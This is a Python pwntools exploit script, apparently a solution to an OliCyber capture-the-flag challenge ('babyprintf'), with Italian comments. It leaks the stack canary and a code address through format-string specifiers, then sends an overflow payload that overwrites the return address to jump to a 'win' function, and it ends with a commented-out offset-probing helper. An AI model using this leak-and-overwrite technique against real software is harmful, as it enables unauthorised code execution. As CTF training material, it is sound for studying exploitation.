from pwn import *
context.binary = ELF('./babyprintf')

def main():
    conn = remote('baby-printf.challs.olicyber.it', 34004)
    
    # Trova il canary
    conn.recvuntil(b":\n")
    conn.sendline(b'%11$p')  # 11 salti
    canary = conn.recvline()[:-1]
    print(f"Canary response: {canary}, lunghezza canary: {len(canary)}")
    canary = int(canary, 16)
    print(f"Canary: {hex(canary)}")
    
    conn.sendline(b'%15$p')         #prendo l'indirizzo del main
    main_addr = conn.recvline()[:-1]    
    main_addr = int(main_addr, 16)
    
    offset = 0x12E4
    win_addres = main_addr - offset #trovo l'indirizzo della funzione win 
    win_addres = 0x12AE + win_addres
    print(f'offset: {hex(win_addres)}')  
    
    
    payload = b'A' * 40    #Padding per Buffer
    payload += p64(canary)  #canary
    payload += b'B' * 8     #Padding per RBP
    payload += p64(win_addres)  #Indirizzo della funzione win

    conn.sendline(payload)
    # response = conn.recvline()
    # print(f'response: {response}')
    conn.interactive()

if __name__ == "__main__":
    main()

'''
from pwn import *

def main():
    conn = remote('baby-printf.challs.olicyber.it', 34004)

    for i in range(1, 20):  # Testa i primi 20 offset
        conn.recvuntil(b":\n")
        conn.sendline(f'%{i}$p'.encode())  # Invia %i$p
        response = conn.recvline()
        if len(response) >= 16:
            print(f"Offset {i}: {response}")
        conn.close()
        conn = remote('baby-printf.challs.olicyber.it', 34004)  # Riapri connessione

if __name__ == "__main__":
    main()
'''




